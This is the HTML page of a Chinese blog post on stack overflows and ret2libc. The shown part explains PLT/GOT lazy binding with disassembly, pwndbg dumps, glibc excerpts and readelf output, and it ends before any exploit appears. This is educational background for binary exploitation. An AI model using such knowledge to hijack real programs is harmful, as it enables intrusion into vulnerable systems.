@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+<html lang="zh">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="symlPigeon">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="symlPigeon">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="PLT和GOT表 之前在调试的程序里经常会看到这样子的东西： 1call   8049050 &lt;gets@plt&gt; 在调用对应的函数的时候并不是直接跳转到目标函数的地址，而是经过了一个.plt段。这个plt也就是procedure linkage table。这里就细说一下具体的东西。 我们写一个这样子的程序并编译： 1234567#include &lt;stdio.h&gt;int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出，ret2libc">
+<meta property="og:url" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/index.html">
+<meta property="og:site_name" content="symlpigeon&#39;s little gensokyo">
+<meta property="og:description" content="PLT和GOT表 之前在调试的程序里经常会看到这样子的东西： 1call   8049050 &lt;gets@plt&gt; 在调用对应的函数的时候并不是直接跳转到目标函数的地址，而是经过了一个.plt段。这个plt也就是procedure linkage table。这里就细说一下具体的东西。 我们写一个这样子的程序并编译： 1234567#include &lt;stdio.h&gt;int">
+<meta property="og:locale">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/gdb1.jpg">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/gdb2.jpg">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/gdb3.jpg">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/gdb4.jpg">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/lazybinding.jpg">
+<meta property="og:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/buf2.jpg">
+<meta property="article:published_time" content="2022-03-30T05:07:21.000Z">
+<meta property="article:modified_time" content="2022-03-30T16:02:43.756Z">
+<meta property="article:author" content="symlPigeon">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/gdb1.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>栈溢出，ret2libc · syml&#39;s little gensokyo</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-EDRLRX5SK9"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+
+            gtag('config', 'G-EDRLRX5SK9');
+        </script>
+    
+    
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header-page header-page-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>symlpigeon's little gensokyo</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">symlpigeon&#39;s little gensokyo</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">栈溢出，ret2libc</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                栈溢出，ret2libc
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        
+        
+            
+        
+        
+        <span class="post-category" data-categories="二进制"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                二进制
+            </span>
+        </span>
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Pwn">Pwn</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.7k</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/03/30</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="plt和got表">PLT和GOT表</h1>
+<p>之前在调试的程序里经常会看到这样子的东西：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">call</span>   <span class="number">8049050</span> &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>在调用对应的函数的时候并不是直接跳转到目标函数的地址，而是经过了一个<code>.plt</code>段。这个<code>plt</code>也就是<strong>procedure
+linkage table</strong>。这里就细说一下具体的东西。</p>
+<p>我们写一个这样子的程序并编译：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看反编译之后的<code>main</code>函数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8049193</span>:       <span class="number">8d</span> <span class="number">83</span> <span class="number">08</span> e0 ff ff       <span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x1ff8</span>]</span><br><span class="line"><span class="number">8049199</span>:       <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">804919a:       e8 b1 fe ff ff          <span class="keyword">call</span>   <span class="number">8049050</span> &lt;puts@plt&gt;</span><br><span class="line">804919f:       <span class="number">83</span> c4 <span class="number">10</span>                <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">80491a2:       <span class="number">83</span> ec 0c                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">80491a5:       <span class="number">8d</span> <span class="number">83</span> 0f e0 ff ff       <span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x1ff1</span>]</span><br><span class="line">80491ab:       <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">80491ac:       e8 9f fe ff ff          <span class="keyword">call</span>   <span class="number">8049050</span> &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里调用的是函数<code>puts@plt</code>而不是<code>puts</code>。我们继续反编译<code>puts@plt</code>，发现这是在<code>.plt</code>段里:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049050</span> &lt;puts@plt&gt;:</span><br><span class="line"> <span class="number">8049050</span>:       ff <span class="number">25</span> <span class="number">10</span> c0 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">jmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">ds</span>:<span class="number">0x804c010</span></span><br><span class="line"> <span class="number">8049056</span>:       <span class="number">68</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x8</span></span><br><span class="line"> 804905b:       e9 d0 ff ff ff          <span class="keyword">jmp</span>    <span class="number">8049030</span> &lt;_init+<span class="number">0x30</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>这里程序首先跳转到了<code>ds:0x804c010</code>这个地方，这是哪里？</p>
+<p>我们通过gdb跟进调试。</p>
+<p><img src="gdb1.jpg" /></p>
+<p>我们查看内存对应区块的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x 0x804c010</span><br><span class="line">0x804c010 &lt;puts@got.plt&gt;:       0x08049056</span><br></pre></td></tr></table></figure>
+<p>也就是说这条<code>jmp DWORD PTR ds:0x804c010</code>指令跳转到的地方实际上就是它的下一条语句。这里的GOT全程是<strong>Global
+Offset Table</strong>。我们接着往后看。</p>
+<p>程序在<code>push 8</code>之后执行了<code>jmp 0x8049030</code>。在objdump中，跳转的目的地址是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08049030 &lt;__libc_start_main@plt-0x10&gt;:</span><br><span class="line"> 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004</span><br><span class="line"> 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008</span><br><span class="line"> 804903c:       00 00                   add    BYTE PTR [eax],al</span><br></pre></td></tr></table></figure>
+<p>程序首先将<code>DWORD PTR ds:0x804c004</code>地址的数据压入栈中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x 0x804c004</span><br><span class="line">0x804c004:      0xf7ffda20</span><br></pre></td></tr></table></figure>
+<p>接下来，程序跳转进入<code>_dl_runtime_resolve</code>中。实际上，这个函数是动态重定位中的关键函数。这个函数的位置在<code>glibc/sysdep/&lt;machine type&gt;/dl-trampoline.S</code>中。删去一些代码以便理解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %edx</span><br><span class="line">	movl 16(%esp), %edx	# Copy args pushed by PLT in register.  Note</span><br><span class="line">	movl 12(%esp), %eax	# that fixup takes its parameters in regs.</span><br><span class="line">	call _dl_fixup		# Call resolver.</span><br><span class="line">	popl %edx		# Get register content back.</span><br><span class="line">	movl (%esp), %ecx</span><br><span class="line">	movl %eax, (%esp)	# Store the function address.</span><br><span class="line">	movl 4(%esp), %eax</span><br><span class="line">	ret $12			# Jump to function address.</span><br></pre></td></tr></table></figure>
+<p>这个函数首先将寄存器压栈以保存寄存器的值。接下来，函数从栈上读取数据放入寄存器中。</p>
+<p>执行到语句<code>movl 16(%esp), %edx</code>之前，栈中的状态是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp 0xffffd528 —▸ 0xffffd590 —▸ 0xf7f6ee3c (_GLOBAL_OFFSET_TABLE_) ◂— 0x224d6c /* &#x27;lM&quot;&#x27; */ =&gt; EDX</span><br><span class="line">01:0004│     0xffffd52c —▸ 0xffffd570 ◂— 0x1 =&gt; ECX</span><br><span class="line">02:0008│     0xffffd530 —▸ 0x804a008 ◂— &#x27;Hello.&#x27; =&gt; EAX</span><br><span class="line">03:000c│     0xffffd534 —▸ 0xf7ffda20 ◂— 0x0 =&gt; move into EAX</span><br><span class="line">04:0010│     0xffffd538 ◂— 0x8 =&gt; move into EDX</span><br></pre></td></tr></table></figure>
+<p>接下来程序进入了<code>_dl_fixup</code>函数。这个函数定义在<code>glibc/elf/dl-runtime.c</code>中。</p>
+<blockquote>
+<p>/* This function is called through a special trampoline from the PLT
+the first time each PLT entry is called. We must perform the relocation
+specified in the PLT of the given shared object, and return the resolved
+function address to the trampoline, which will restart the original call
+to that address. Future calls will bounce directly from the PLT to the
+function. */</p>
+</blockquote>
+<p>函数的定义是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line">	   struct link_map *l, </span><br><span class="line">       ElfW(Word) reloc_arg</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>这里需要加上<strong>一些</strong>额外的<a
+href="/2022/02/10/re-review2/">信息</a>，一个程序具体的动态链接细节是保存在了<code>.dynamic</code>节中。我们可以通过<code>readelf</code>读取文件中<code>dynamic</code>节的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d test</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2f0c contains 24 entries:</span><br><span class="line">  标记        类型                         名称/值</span><br><span class="line"> 0x00000001 (NEEDED)                     共享库：[libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8049000</span><br><span class="line"> 0x0000000d (FINI)                       0x80491c4</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x804bf04</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x804bf08</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x8048240</span><br><span class="line"> 0x00000005 (STRTAB)                     0x80482d0</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x8048260</span><br><span class="line"> 0x0000000a (STRSZ)                      139 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804c000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   16 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80483b4</span><br><span class="line"> 0x00000011 (REL)                        0x804839c</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x804836c</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x804835c</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
+<p>在<code>dynamic</code>节中，存放的是这样的数据结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure>
+<p>其中<code>d_tags</code>用来确定<code>d_un</code>的类型。它的具体取值可以在ELF对应的<a
+target="_blank" rel="noopener" href="https://refspecs.linuxfoundation.org/elf/elf.pdf">文档</a>里查看到。</p>
+<p>有一些重要的取值：</p>
+<p><code>DT_STRTAB</code>：对应的<code>d_un</code>是<code>Elf32_Addr</code>类型，存放了字符串表。</p>
+<p><code>DT_SYMTAB</code>：对应的<code>d_un</code>是<code>Elf32_Addr</code>类型，存放了符号表。</p>
+<p><code>DT_RELA</code>和<code>DT_REL</code>：对应的<code>d_un</code>是<code>Elf32_Addr</code>类型，存放了重定位表。<code>DT_RELASZ</code>和<code>DT_RELSZ</code>对应的表项里是重定位表的总大小。<code>DT_RELAENT</code>和<code>DT_RELENT</code>对应的表项中则是重定位表单个项目的大小。（实际上上面<code>DT_STRTAB</code>和<code>DT_SYMTAB</code>对应的大小也是类似的命名方式）</p>
+<p><code>DT_JMPREL</code>：存放了需要重定位的函数信息（对应了<code>.rel.plt</code>节）。总大小和表项大小的命名和上面类似。</p>
+<p>在重定位表中，存放了这样的数据结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Sword r_addend;</span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>
+<p>其中<code>Elf32_Rel</code>对应了<code>DT_REL</code>，<code>Elf32_Rela</code>对应了<code>DT_RELA</code>。</p>
+<p>我们可以使用readelf查看重定位信息：</p>
